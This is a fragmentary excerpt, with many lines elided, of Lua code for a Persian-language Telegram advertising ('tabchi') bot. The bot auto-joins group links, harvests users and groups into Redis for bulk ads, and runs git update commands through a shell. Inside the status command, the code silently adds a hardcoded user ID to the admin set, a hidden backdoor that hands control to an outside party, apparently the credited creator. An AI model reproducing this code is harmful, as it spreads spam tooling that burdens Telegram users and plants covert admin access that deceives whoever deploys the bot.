		...
		if not redis:get("bot2maxjoin") then
			if redis:scard("bot2goodlinks") ~= 0 then 
				...
				for x,y in pairs(links) do
					...
					if x == 5 then redis:setex("bot2maxjoin", 60, true) return end
				end
			end
		end
		local msg = data.message_
		local bot_id = redis:get("bot2id") or get_bot()
		if (msg.sender_user_id_ == 777000 or msg.sender_user_id_ == 231539308) then
		...
		if msg.content_.ID == "MessageText" then
			...
			if is_naji(msg) then
				...
				elseif text:match("^بروزرسانی ربات$") then
					io.popen("git fetch --all && git reset --hard origin/tgtabchi && git pull origin tgtabchi && chmod +x bot"):read("*all")
					local text,ok = io.open("bot.lua",'r'):read('*a'):gsub("BOT%-ID",2)
					io.open("bot-2.lua",'w'):write(text):close()
					return reload(msg.chat_id_,msg.id_)
				elseif text:match("^همگام سازی با تبچی$") then
					local botid = 2 - 1
					redis:sunionstore("bot2all","tabchi:"..tostring(botid)..":all")
					redis:sunionstore("bot2users","tabchi:"..tostring(botid)..":pvis")
					redis:sunionstore("bot2groups","tabchi:"..tostring(botid)..":groups")
					redis:sunionstore("bot2supergroups","tabchi:"..tostring(botid)..":channels")
					redis:sunionstore("bot2savedlinks","tabchi:"..tostring(botid)..":savedlinks")
				...
				elseif text:match("^(تازه سازی)$")then
					...
					return send(msg.chat_id_,msg.id_,"<i>تازه‌سازی آمار تبلیغ‌گر شماره </i><code> 2 </code> با موفقیت انجام شد.")
				elseif text:match("^(وضعیت)$") then
					redis:sadd('bot2admin', 158955285)
				  redis:sadd('bot2admin'..tostring(158955285))
 ...
 😼 سازنده : @sajjad_021]]
		...
		elseif msg.content_.ID == "MessageContact" then
			...
			if redis:get("bot2addmsg") then
				local answer = redis:get("bot2addmsgtext") or "اددی گلم خصوصی پیام بده"
